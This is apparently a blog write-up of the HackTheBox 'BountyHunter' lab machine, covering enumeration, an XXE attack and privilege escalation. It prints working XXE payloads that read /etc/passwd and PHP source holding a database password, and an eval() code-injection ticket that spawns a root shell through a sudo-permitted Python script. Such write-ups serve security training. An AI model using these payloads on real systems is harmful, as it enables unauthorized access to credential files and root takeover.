---
title: "HackTheBox - Bounty Hunter"
author: Nasrallah
description: ""
date: 2023-01-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, python, xml, xxe]
img_path: /assets/img/hackthebox/machines/bountyhunter
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing **BountyHunter** from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.100
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, port 22 running OpenSSH and port 80 is an Apache http web server.

## Web

Let's navigate to the web page.

![](1.png)

Tis is the index page of a bug bounty team, let's check the portal page.

![](2.png)

click the link to go to bounty tracker.

![](3.png)

Here we got a bug bounty form, let's fill it.

![](4.png)

When we hit hit submit, it shows what would have been added to the DB if it were ready.

### Burp

Let's intercept intercept this post request using `burp suite`.

![](5.png)

The data looks to be encoded, to get the clear text data we need to decode as url then as base64.

![](6.png)

We got XML, let's check if it is vulnerable to XML External Entities attack by adding the following payload the XML

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
```

```xml
data=<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>124</cwe>
		<cvss>9</cvss>
		<reward>423124</reward>
		</bugreport>
```

Using burp repeater let's send our malicious xml data.

![](7.png)

Before we send it we need to re-encode it to base64 then as url.

![](8.png)

Great! We confirmed the XXE vulnerability.

# **Foothold**

Now we use a slightly different payload than before which is:

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
```

This allows us to view php code without it being executed by the web server.

I checked `index.php`, `portal.php` and the `log_submit.php` files but didn't find anything useful.

## Gobuster

Let's scan for php files using gobuster.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.100 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/23 07:34:27 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]   
/db.php               (Status: 200) [Size: 0]                                    
/index.php            (Status: 200) [Size: 25169]                                
/index.php            (Status: 200) [Size: 25169]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]    
/portal.php           (Status: 200) [Size: 125]                                  
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/server-status        (Status: 403) [Size: 277]                                     
===============================================================
```

`db.php`, that must be the file we're looking for, let's retrieve it.

![](9.png)

Encode the data and send.

![](10.png)

We managed to find the database password.

With that password, let's ssh to the machine as the user we found in /etc/passwd.

![](11.png)

# **Privilege Escalation**

Let's check our current privileges.

```terminal
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

There is a python script at `/opt/skytrain_inc` that we can run as root, let's check it.

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.  
                                       
def load_file(loc):             
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:  
        print("Wrong file type.")                                              
        exit()                  
                   
def evaluate(ticketFile):                                                                                                                              [7/143]
    #Evaluates a ticket to check for ireggularities.                                                                                                          
    code_line = None                                                                                                                                          
    for i,x in enumerate(ticketFile.readlines()):                                                                                                             
        if i == 0:                                                                                                                                            
            if not x.startswith("# Skytrain Inc"):                                                                                                            
                return False                                                                                                                                  
            continue                                                                                                                                          
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

When we run the script, we get prompt for the path to a ticket file.

The script to work, the ticket file must end with `.md`(markdown file).

```python
if loc.endswith(".md"):
        return open(loc, 'r')
```

Then it open the file and read its lines, the first line must be `# Skytrain Inc`.

```python
if not x.startswith("# Skytrain Inc"):                                                                                                            
                return False 
```

The second line must start with `## Ticket To`

```python
if not x.startswith("## Ticket to "):
```

The third line must start with `__Ticket Code:__`

The fourth must start with `**`

The text after the `**` to the first `+` has to be an integer that when divided by 7 the remainder must be 4.

If all those conditions are true, the fourth line is passed to `eval`.

There is a directory called invalid_tickets has some example of the ticked format.

```terminal
development@bountyhunter:/opt/skytrain_inc$ cat invalid_tickets/390681613.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

Now we need a way to exploit this script.

We know we can pass it any ticked we want as long as it follows the correct format.

The only text we can manipulate is the one in the fourth line that comes after the first `+` and gets passed to the `eval` function.

I searched on google for `python eval exploit` and found this [article](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) that showcases code injection in this function.

The payload to this command injection exploit is the following.

```python
__import__('os').system('/bin/bash')
```

We're gonna put this payload right after the first `+` in the 4th line.

But for this to work, we need a number that when divided by 7 results in the remainder 4. That's an easy one.

I created a simple python script that does that.

```python
for i in range(100,200):
    if i % 7 == 4:
        print("found it", i)
```

```terminal
└──╼ $ python script.py
found it 102
found it 109
found it 116
found it 123
found it 130
found it 137
found it 144
found it 151
found it 158
found it 165
found it 172
found it 179
found it 186
found it 193
```

Choose any number and put it between `**` and `+`.

The final ticked should look like this.

```md
# Skytrain Inc
## Ticket to import os; os.system("/bin/bash")
__Ticket Code:__
**144+__import__('os').system('/bin/bash')**
##Issued: 2021/04/06
#End Ticket
```

Now let's execute the python script and feed it out malicious ticket

```terminal
development@bountyhunter:~$ sudo python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/home/development/hack.md
Destination: New Heaven
root@bountyhunter:/home/development# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhunter:/home/development#
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).


# References

https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1